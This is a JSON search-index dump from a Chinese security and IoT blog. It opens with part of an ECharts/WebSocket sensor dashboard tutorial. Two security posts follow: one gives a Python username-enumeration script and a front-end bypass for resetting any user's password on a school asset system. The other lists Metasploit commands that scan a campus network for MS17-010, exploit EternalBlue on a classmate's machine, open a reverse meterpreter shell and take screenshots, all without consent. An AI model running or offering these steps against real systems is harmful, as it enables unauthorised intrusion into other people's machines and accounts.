&#125;,\n \n    Hum3_options:&#123;\n        tooltip: &#123;\n            formatter: &#39;&#123;a&#125; &lt;br&#x2F;&gt;&#123;b&#125; : &#123;c&#125;%&#39;\n        &#125;,\n        toolbox: &#123;\n            feature: &#123;\n                restore: &#123;&#125;,\n                saveAsImage: &#123;&#125;\n            &#125;\n        &#125;,\n        series: [\n            &#123;\n                name: &#39;节点三&#39;,\n                type: &#39;gauge&#39;,\n                detail: &#123;formatter: &#39;&#123;value&#125;%&#39;&#125;,\n                data: [&#123;value: hum3, name: &#39;湿度3&#39;&#125;]\n            &#125;\n        ]\n    &#125;\n \n&#125;;\n \nfunction update_value(value) &#123;\n    for (i in data) &#123;\n        if (data[i].length &gt;&#x3D; num) &#123;\n            for (j &#x3D; 0; j &lt; num - 1; j++) &#123;\n                data[i][j] &#x3D; data[i][j + 1];\n            &#125;\n            if (i &#x3D;&#x3D; &#39;date&#39;) data[i][num - 1] &#x3D; value[i];&#x2F;&#x2F;.slice(11)\n            else data[i][num - 1] &#x3D; value[i];\n        &#125; else &#123;\n            if (i &#x3D;&#x3D; &#39;date&#39;) data[i].push(value[i]);&#x2F;&#x2F;.slice(11)\n            else data[i].push(value[i]);\n        &#125;\n        &#x2F;&#x2F;data.hum1&#x3D;value[&quot;humidity1&quot;];\n        &#x2F;&#x2F;data.hum2&#x3D;value[&quot;humidity2&quot;];\n        &#x2F;&#x2F;data.hum3&#x3D;value[&quot;humidity3&quot;];\n    &#125;\n    options.Hum1_options.series[0].data[0].value&#x3D;value[&quot;humidity1&quot;];\n    options.Hum2_options.series[0].data[0].value&#x3D;value[&quot;humidity2&quot;];\n    options.Hum3_options.series[0].data[0].value&#x3D;value[&quot;humidity3&quot;];\n    &#x2F;*\n    hum1&#x3D;value[&quot;humidity1&quot;];\n    hum2&#x3D;value[&quot;humidity2&quot;];\n    hum3&#x3D;value[&quot;humidity3&quot;];\n    *&#x2F;\n    Tem_echarts.setOption(options.Tem_options);\n    Ill_echarts.setOption(options.Ill_options);\n \n    Hum_echarts1.setOption(options.Hum1_options);\n    Hum_echarts2.setOption(options.Hum2_options);\n    Hum_echarts3.setOption(options.Hum3_options);\n&#125;\nif (&quot;WebSocket&quot; in window) &#123;\n    &#x2F;&#x2F;alert(&quot;您的浏览器支持 WebSocket!&quot;);\n \n    &#x2F;&#x2F; 打开一个 web socket\n    var ws &#x3D; new WebSocket(&quot;ws:&#x2F;&#x2F;localhost:1234&#x2F;cshnet&quot;);\n \n    ws.onopen &#x3D; function() &#123;\n        &#x2F;&#x2F; Web Socket 已连接上，使用 send() 方法发送数据\n        &#x2F;&#x2F;ws.send(&quot;get&quot;);\n        &#x2F;&#x2F;alert(&quot;数据发送中...&quot;);\n        connection_flag &#x3D; true;\n    &#125;;\n \n    ws.onmessage &#x3D; function(evt) &#123;\n        var recv_value &#x3D; evt.data;\n        var reader &#x3D; new FileReader();\n        reader.readAsText(recv_value, &#39;utf-8&#39;);\n        reader.onload &#x3D; function(event)&#123;\n            var content &#x3D; reader.result;&#x2F;&#x2F;内容就在这里\n            console.log(JSON.parse(content));\n            update_value(JSON.parse(content))\n        &#125;;\n        \n    &#125;;\n \n    ws.onclose &#x3D; function() &#123;\n        &#x2F;&#x2F; 关闭 websocket\n        connection_flag &#x3D; false;\n        alert(&quot;连接已关闭...&quot;);\n    &#125;;\n&#125; else &#123;\n    &#x2F;&#x2F; 浏览器不支持 WebSocket\n    alert(&quot;您的浏览器不支持,请更换浏览器！&quot;);\n&#125;\n \n \n \nsetInterval(get_value, time);\n \n \nfunction get_value() &#123;\n    if (connection_flag) &#123;\n        ws.send(&#39;get&#39;);\n    &#125;\n \n&#125;\n嗯。。。基本上已经完成了，C#的一些初始化以及布局代码就不贴了，额，有点乱，如果有需要的话可以留言，反正核心代码已经贴出来了，最后再贴一下HTML吧，貌似也没必要，不过还是贴一下吧\n&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n \n&lt;head&gt;\n    &lt;meta charset&#x3D;&quot;utf-8&quot;&gt;\n    &lt;title&gt;基于Zgbee的光照温湿度检测系统设计&lt;&#x2F;title&gt;\n    &lt;!-- 引入 echarts.js --&gt;\n    &lt;script type&#x3D;&quot;text&#x2F;javascript&quot; src&#x3D;&quot;.&#x2F;echarts.min.js&quot;&gt;&lt;&#x2F;script&gt;\n    &lt;script type&#x3D;&quot;text&#x2F;javascript&quot; src&#x3D;&quot;.&#x2F;my_js.js&quot;&gt;&lt;&#x2F;script&gt;\n&lt;&#x2F;head&gt;\n \n&lt;body&gt;\n    &lt;div class&#x3D;&quot;main_div&quot;&gt;\n        &lt;!--温度--&gt;\n        &lt;div id&#x3D;&quot;div_Tem&quot; style&#x3D;&quot;width: calc(40%);height:300px;float:left;margin-left: 5%;&quot;&gt;&lt;&#x2F;div&gt;\n        &lt;!--光照情况--&gt;\n        &lt;div id&#x3D;&quot;div_Ill&quot; style&#x3D;&quot;width: calc(40%);height:300px;float:left;margin-left: 10%;&quot;&gt;&lt;&#x2F;div&gt;\n        &lt;!--湿度--&gt;\n        &lt;div id&#x3D;&quot;div_Hum1&quot; style&#x3D;&quot;width: calc(33%);height:300px;float:left;&quot;&gt;&lt;&#x2F;div&gt;\n        &lt;div id&#x3D;&quot;div_Hum2&quot; style&#x3D;&quot;width: calc(33%);height:300px;float:left;&quot;&gt;&lt;&#x2F;div&gt;\n        &lt;div id&#x3D;&quot;div_Hum3&quot; style&#x3D;&quot;width: calc(33%);height:300px;float:left;&quot;&gt;&lt;&#x2F;div&gt;\n        \n        \n \n    &lt;&#x2F;div&gt;\n \n \n \n \n    &lt;script type&#x3D;&quot;text&#x2F;javascript&quot;&gt;\n        var Tem_echarts &#x3D; echarts.init(document.getElementById(&#39;div_Tem&#39;));\n \n        var Hum_echarts1 &#x3D; echarts.init(document.getElementById(&#39;div_Hum1&#39;));\n        var Hum_echarts2 &#x3D; echarts.init(document.getElementById(&#39;div_Hum2&#39;));\n        var Hum_echarts3 &#x3D; echarts.init(document.getElementById(&#39;div_Hum3&#39;));\n \n        var Ill_echarts &#x3D; echarts.init(document.getElementById(&#39;div_Ill&#39;));\n \n        Tem_echarts.setOption(options.Tem_options);\n        Ill_echarts.setOption(options.Ill_options);\n \n        Hum_echarts1.setOption(options.Hum1_options);\n        Hum_echarts2.setOption(options.Hum2_options);\n        Hum_echarts3.setOption(options.Hum3_options);\n        \n    &lt;&#x2F;script&gt;\n&lt;&#x2F;body&gt;\n \n&lt;&#x2F;html&gt;\n好了，到这里这个东西已经完善了，最后附一下成果图吧。。。\n","slug":"tmp-hum-visualization","date":"2020-07-29T10:06:16.000Z","categories_index":"开发,硬件,硬件,数据可视化,物联网","tags_index":"C#,物联网,数据可视化,echarts","author_index":"Pa2sw0rd"},{"id":"bd1e536e6f629d63f249e64bcb6082d0","title":"记一次任意用户密码修改漏洞","content":"这是一个学校的固定资产管理系统登录页面，尝试几个弱口令未遂，发现有验证码，爆破不是很有可能，决定从前端分析(迁移博客，图片丢失～)  \n当在输入工号后点击其它地方，前端会默认发送一个验证是否有该用户名的请求，服务端会返回一个json数据，code为0用户名不存在，为1表示该用户名存在，并且发现该接口没有任何限制  \n于是写了一个脚本爆破用户名，用户名规律：年份+三位数字  \nimport requests\nurl&#x3D;&#39;http:&#x2F;&#x2F;xxxx&#x2F;ZCGL&#x2F;login&#x2F;checkUsername&#39;\nyear&#x3D;1990\nfor i in range(year,2020):\n    for a in range(0,9):\n        for b in range(0,9):\n            for c in range(0,9):\n                username&#x3D;str(i)+str(a)+str(b)+str(c)\n                dat&#x3D;&#123;&#39;username&#39;:username,&#39;method&#39;:&#39;1,2&#39;&#125;\n                res&#x3D;requests.post(url,dat)\n                if(eval(res.text)[&#39;code&#39;]&#x3D;&#x3D;&#39;1&#39;):\n                    print(username+&#39;存在&#39;)\n有了用户名之后我们在继续往下看，尝试在密保问题和答案处输入随机内容，直接点验证，发现没有任何反应，这应该是服务端没有开启验证吧。。。。但是这时新密码处不能输入，这一看肯定是个前端限制啊，于是乎直接F12删除readonly属性，新密码直接可以输了  \n最后直接点确定，密码修改成功，登录，登上去看了一下，因为是学校网站，不敢多搞，没有深入，直接提交教育src  \n","slug":"change-any-user-passwd","date":"2020-07-28T06:45:41.000Z","categories_index":"安全,web,web","tags_index":"web漏洞","author_index":"Pa2sw0rd"},{"id":"a8cc9a7e29f68e770cf685748e427dea","title":"用永恒之蓝（MS17-010）对校园网进行渗透测试","content":"漏洞描述：通过扫描开放445文件共享端口的Windows机器，无需用户任何操作，只要开机上网，不法分子就能在电脑和服务器中植入勒索软件、远程控制木马、虚拟货币挖矿机等恶意程序。  \n影响版本：目前已知受影响的Windows 版本包括但不限于：WindowsNT，Windows2000、Windows XP、Windows 2003、Windows Vista、Windows 7、Windows 8，Windows 2008、Windows 2008 R2、Windows Server 2012 SP0。  \n复现环境：攻击机：parrotOS （IP：30.0.21.10）\n靶机：随机扫描校园网用户\n正文：心血来潮扫描一下校园网(博客迁移，图片丢失～)，看一下同学们的操作系统补丁打的勤不勤，不扫不知道，一扫吓一跳。。。\n校园网用户通过DHCP分配IP，然后通过PPPoE进行认证。\nIP规律：30.0.0.0-30.0.255.255。\n首先msf加载永恒之蓝扫描器：\nsearch ms17-010\nuse auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_ms17_010\n设置目标及扫描线程：\nset rhost 30.0.0-255.0-255\nset threads 500\nshow options\nrun\n不一会就有结果了，先拿第一个试试30.0.14.154\n打开一个新的终端，启动msf并加载ms17-010的EXP\nsearch ms17-010\nuse exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_eternalblue\nset rhost 30.0.14.154\nrun\n执行过后，win，马上得到了一个shell，system权限\n若中文乱码则设置终端编码为utf-8\n此时的shell是windows的cmd，如果要看个屏幕啊之类的就比较麻烦，这时我们用msf的payload反弹一个shell，用msf提供的，比较方便\nshow payloads\nset payload windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp\nset lhost 30.0.21.10\nrun\n反弹成功，截取一张屏幕截图\n最后我们可以在桌面留一份文档或者找用户的联系方式（QQ or WeChat）告诉用户需要打补丁了。\n要看视频请移步哔哩哔哩，别忘了一键三连呦~~~\n\n    \n","slug":"school-network-ms17010-pentest","date":"2018-10-23T11:59:26.000Z","categories_index":"安全,渗透测试,渗透测试,校园网","tags_index":"渗透测试,永恒之蓝,校园网","author_index":"Pa2sw0rd"}]